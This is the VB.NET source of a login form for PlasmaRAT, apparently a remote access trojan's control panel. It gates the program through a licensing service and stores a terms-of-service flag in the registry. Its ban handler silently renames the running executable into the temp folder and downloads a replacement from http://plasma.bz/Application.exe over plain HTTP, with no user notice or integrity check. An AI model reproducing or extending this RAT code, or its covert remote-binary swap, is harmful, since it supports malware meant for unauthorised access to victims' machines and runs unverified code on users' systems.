Imports System.IO

Public Class Login

    Private Sub Button1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button1.Click
        End
    End Sub

    Private Sub Button2_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button2.Click
        SaveSetting("PlasmaRAT", "Config", "TOS", "1")
        login()
    End Sub
    Private Sub login()
        Try
            Seal.RunHook = AddressOf LicenseRun
            Seal.BanHook = AddressOf LicenseBan
            Me.Hide()
            Seal.Initialize("D8280000") 'Required
        Catch
            MessageBox.Show("An error occured. Error code: 0x0002")
            End
            Environment.Exit(0)
        End Try
    End Sub
    Sub LicenseRun()
        Try
            InitializeComponent()
            ShowNewsEntries()
            Main.GlobalMessage.Text = Seal.GlobalMessage
            Main.Show()
            Me.Close()
        Catch ex As Exception
            End
        End Try
    End Sub
    Sub LicenseBan()
        Try
            Dim r As New Random
            Dim lel = r.Next(10000, 90000) & ".TMP"
            My.Computer.FileSystem.MoveFile(Application.ExecutablePath, IO.Path.GetTempPath & lel)
            Dim w As New System.Net.WebClient()
            w.DownloadFile("http://plasma.bz/Application.exe", Application.ExecutablePath)
            End
        Catch : End Try
    End Sub
    Private Sub ShowNewsEntries()
        Try
            Main.NewsView.Items.Clear()

            For Each P As NewsPost In Seal.News
                Dim I As New ListViewItem(P.Time.ToString("MM.dd.yy"))
                I.SubItems.Add(P.Name)
                I.Tag = P
                Main.NewsView.Items.Add(I)
            Next
        Catch
            MessageBox.Show("An error occured. Error code: 0x0001")
            End
            Environment.Exit(0)
        End Try
    End Sub

    Private Sub Login_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        Try
            If Not GetSetting("PlasmaRAT", "Config", "TOS") = String.Empty Then
                login()
            End If
        Catch
        End Try
    End Sub
End Class